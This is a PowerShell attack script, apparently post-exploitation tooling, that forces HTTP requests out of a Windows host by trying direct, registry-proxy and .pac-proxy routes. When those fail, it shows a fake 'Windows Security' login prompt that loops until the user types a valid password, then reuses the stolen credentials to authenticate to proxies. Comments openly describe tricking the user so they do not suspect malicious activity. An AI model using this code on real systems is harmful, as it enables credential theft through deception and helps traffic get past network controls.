#requires -version 2
function Invoke-ForceWebRequest {
    <#

    .SYNOPSIS

    .PARAMETER Iterate

    .OUTPUTS
    
    .EXAMPLE

    #>
    [CmdletBinding()]
    [OutputType([psobject])]
    param(
        [Parameter(Mandatory=$true)]
        [String]
        $URL,

        [Parameter(Mandatory=$true)]
        [String]
        $DummyURL,

        [Parameter(Mandatory=$true)]
        [String]
        $DummyString = 'dummystring'
    )
    begin {
        # Modified version of 'Invoke-LoginPrompt' by @enigma0x3
        # https://github.com/enigma0x3/Invoke-LoginPrompt/blob/master/Invoke-LoginPrompt.ps1
        function Invoke-LoginPrompt{
            do {
                $cred = $Host.ui.PromptForCredential("Windows Security", "Invalid Credentials, Please try again", "$env:userdomain\$env:username","")
                $username = "$env:username"
                $domain = "$env:userdomain"
                $full = "$domain" + "\" + "$username"
                $password = $cred.GetNetworkCredential().password
                Add-Type -assemblyname System.DirectoryServices.AccountManagement
                $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
            } while($DS.ValidateCredentials("$full", "$password") -ne $True);
            
            $output = $cred.GetNetworkCredential() | select-object UserName, Domain, Password
            $output
        }

        # Invoke-BasicWebRequest by @daniel0x00
        #
        function Invoke-BasicWebRequest {
            [CmdletBinding()]
            [OutputType([psobject])]
            param(
                [Parameter(Mandatory=$true,
                        ValueFromPipeline=$true,
                        Position=0)]
                [ValidateNotNullOrEmpty()]
                [String]
                $URL,

                [Parameter(Mandatory=$false)]
                [String]
                $UserAgent = 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko',

                [Parameter(Mandatory=$false)]
                [String]
                $ProxyURL,

                [Parameter(Mandatory=$false)]
                [String]
                $ProxyUser,

                [Parameter(Mandatory=$false)]
                [String]
                $ProxyPassword,

                [Parameter(Mandatory=$false)]
                [Switch]
                $ProxyDefaultCredentials
            )

            # Ensure URLs contains at least an 'http' protocol:
            if (-not ($URL -match "http")) { $URL = 'http://'+$URL }
            if (-not ($ProxyURL -match "http")) { $ProxyURL = 'http://'+$ProxyURL }

            $request = [System.Net.WebRequest]::Create($URL)
            $request.UserAgent = $UserAgent
            $request.Accept = "*/*"

            # Proxy settings
            if ($ProxyURL) { 
                $proxy = New-Object System.Net.WebProxy
                $proxy.Address = $ProxyURL
                $request.Proxy = $proxy

                if ($ProxyUser) {
                    if ($ProxyDefaultCredentials) {
                        $request.UseDefaultCredentials = $true
                        Write-Verbose "Established proxy URL to $ProxyURL and using default credentials"
                    }
                    else {
                        $secure_password    = ConvertTo-SecureString $ProxyPassword -AsPlainText -Force;
                        $proxy.Credentials  = New-Object System.Management.Automation.PSCredential ($ProxyUser, $secure_password);

                        Write-Verbose "Established proxy URL to $ProxyURL and using $ProxyUser credentials"
                    }
                }
                else { Write-Verbose "Established proxy URL to $ProxyURL" }
            }

            try {
                Write-Verbose "Trying to get $URL"

                $response               = $request.GetResponse()
                $response_stream        = $response.GetResponseStream();
                $response_stream_reader = New-Object System.IO.StreamReader $response_stream;
                $response_text          = $response_stream_reader.ReadToEnd(); 
                $response_status_code   = ($response.StatusCode) -as [int]

                $out = New-Object -TypeName PSObject
                $out | Add-Member -MemberType NoteProperty -Name StatusCode -Value $response_status_code
                $out | Add-Member -MemberType NoteProperty -Name Content -Value $response_text
                $out
            }
            catch {
                $response = $_.Exception.InnerException
                $response_status_code = [int](([regex]::Match($_.Exception.InnerException,"\((?<status_code>\d{3})\)")).groups["status_code"].value)

                $out = New-Object -TypeName PSObject
                $out | Add-Member -MemberType NoteProperty -Name StatusCode -Value $response_status_code
                $out | Add-Member -MemberType NoteProperty -Name Content -Value $response
                $out
            }
        }
    }
    process {
        # Ensure URLs contains at least an 'http' protocol:
        if (-not ($URL -match "http")) { $URL = 'http://'+$URL }
        if (-not ($DummyURL -match "http")) { $DummyURL = 'http://'+$DummyURL }

        # 1: no-proxy webrequest
        Write-Verbose "Trying http get with method #1: simple request..."
        $request = Invoke-BasicWebRequest $DummyURL
        if ($request | select -first 1 | % { $_.content -match $DummyString }) { return }

        # getting basic proxy settiongs
        $proxy_settings     = Get-ItemProperty 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings'
        $proxy_server       = $proxy_settings | % { $_.ProxyServer }
        $proxy_auto_url     = $proxy_settings | % { $_.AutoConfigURL }
        $proxy_pac_regex    = "PROXY\s+(?<proxy>[A-Za-z0-9\.]+\:\d{1,5})"

        # 2: basic-server webrequest
        Write-Verbose "Trying http get with method #2: request with just URL proxy ($proxy_server)..."
        $request = Invoke-BasicWebRequest $DummyURL -ProxyURL $proxy_server
        if ($request | select -first 1 | % { $_.content -match $DummyString }) { return }

        # 3: .pac webrequest
        if ($proxy_auto_url -ne $null) {
            $proxy_pac_config   = (New-Object System.Net.WebClient).DownloadString($proxy_auto_url)
            
            if ($proxy_pac_config -ne $null) {
                # iterate through each proxy url match:
                $proxy_pac_config | Select-String $proxy_pac_regex -AllMatches | % { $_.Matches } | % { 
                    # request dummystring for each proxy-url
                    $proxy_server_pac = $_.Groups["proxy"].Value

                    Write-Verbose "Trying http get with method #3: request with just URL proxy from .pac file ($proxy_server_pac)..."
                    $request = Invoke-BasicWebRequest $DummyURL -ProxyURL $proxy_server_pac
                    if ($request | select -first 1 | % { $_.content -match $DummyString }) { return }
                }
            }
        }

        # 4: at this point, we need to trick the user with a fake credential request.
        #    the credential window will be the Windows original one, so user should not suspect of a malicious activity.
        #    user will be prompt until he/she writes a valid credential. 
        Invoke-LoginPrompt | ForEach-Object {
            $username   = $_.UserName
            $password   = $_.Password
            Write-Verbose "We have the credentials of $username user!"

            # 4.1: request with the default proxy URL and credentials.
            Write-Verbose "Trying http get with method #4.1: request with URL proxy ($proxy_server) and $username credential..."
            $request = Invoke-BasicWebRequest $DummyURL -ProxyURL $proxy_server -ProxyUser $username -ProxyPassword $password
            if ($request | select -first 1 | % { $_.content -match $DummyString }) { return }

            # 4.2: request with the .pac proxys URLs and credentials.
            if ($proxy_auto_url -ne $null) {
                $proxy_pac_config   = (New-Object System.Net.WebClient).DownloadString($proxy_auto_url)
                
                if ($proxy_pac_config -ne $null) {
                    # iterate through each proxy url match:
                    $proxy_pac_config | Select-String $proxy_pac_regex -AllMatches | % { $_.Matches } | % { 
                        # request dummystring for each proxy-url
                        $proxy_server_pac = $_.Groups["proxy"].Value

                        Write-Verbose "Trying http get with method #4.1: request with URL proxy from .pac file ($proxy_server_pac) and $username credential..."
                        $request = Invoke-BasicWebRequest $DummyURL -ProxyURL $proxy_server_pac -ProxyUser $username -ProxyPassword $password
                        if ($request | select -first 1 | % { $_.content -match $DummyString }) { return }
                    }
                }
            }
        }
    }
    end { $request }
}